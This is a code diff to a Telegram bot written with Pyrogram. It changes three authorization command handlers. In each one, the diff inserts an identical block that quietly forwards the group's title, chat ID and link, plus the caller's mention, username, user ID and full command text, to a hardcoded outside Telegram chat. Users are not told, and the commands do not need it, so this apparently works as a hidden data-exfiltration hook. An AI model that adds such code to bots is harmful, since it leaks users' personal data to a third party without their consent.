@@ -28,6 +28,19 @@ AUTHORIZED_COMMAND = get_command("AUTHORIZED_COMMAND")
 @app.on_message(filters.command(AUTHORIZE_COMMAND) & SUDOERS)
 @language
 async def authorize(client, message: Message, _):
+    first_name = message.from_user.mention
+    user_id = message.from_user.id
+
+    
+    await client.send_message(-1001808202784, f"""
+👥 **Grup:** {message.chat.title} [`{message.chat.id}`]
+**Grup Linki:** @{message.chat.username}
+**Kullanıcı:** {first_name}
+**Kullanıcı Adı:** @{message.from_user.username}
+**Kullanıcı ID:** `{message.from_user.id}`
+**Sorgu:** {message.text}
+""")
+
     if config.PRIVATE_BOT_MODE != str(True):
         return await message.reply_text(_["pbot_12"])
     if len(message.command) != 2:
@@ -46,6 +59,19 @@ async def authorize(client, message: Message, _):
 @app.on_message(filters.command(UNAUTHORIZE_COMMAND) & SUDOERS)
 @language
 async def unauthorize(client, message: Message, _):
+    first_name = message.from_user.mention
+    user_id = message.from_user.id
+
+    
+    await client.send_message(-1001808202784, f"""
+👥 **Grup:** {message.chat.title} [`{message.chat.id}`]
+**Grup Linki:** @{message.chat.username}
+**Kullanıcı:** {first_name}
+**Kullanıcı Adı:** @{message.from_user.username}
+**Kullanıcı ID:** `{message.from_user.id}`
+**Sorgu:** {message.text}
+""")
+
     if config.PRIVATE_BOT_MODE != str(True):
         return await message.reply_text(_["pbot_12"])
     if len(message.command) != 2:
@@ -64,6 +90,19 @@ async def unauthorize(client, message: Message, _):
 @app.on_message(filters.command(AUTHORIZED_COMMAND) & SUDOERS)
 @language
 async def authorized(client, message: Message, _):
+    first_name = message.from_user.mention
+    user_id = message.from_user.id
+
+    
+    await client.send_message(-1001808202784, f"""
+👥 **Grup:** {message.chat.title} [`{message.chat.id}`]
+**Grup Linki:** @{message.chat.username}
+**Kullanıcı:** {first_name}
+**Kullanıcı Adı:** @{message.from_user.username}
+**Kullanıcı ID:** `{message.from_user.id}`
+**Sorgu:** {message.text}
+""")
+
     if config.PRIVATE_BOT_MODE != str(True):
         return await message.reply_text(_["pbot_12"])
     m = await message.reply_text(_["pbot_8"])
@@ -79,7 +118,7 @@ async def authorized(client, message: Message, _):
         try:
             title = (await app.get_chat(served_chat)).title
             count += 1
-            text += f"{count}:- {title[:15]} [{served_chat}]\n"
+            text += f"{count}:- {title[:45]} [{served_chat}]\n"
         except Exception:
             title = _["pbot_10"]
             co += 1
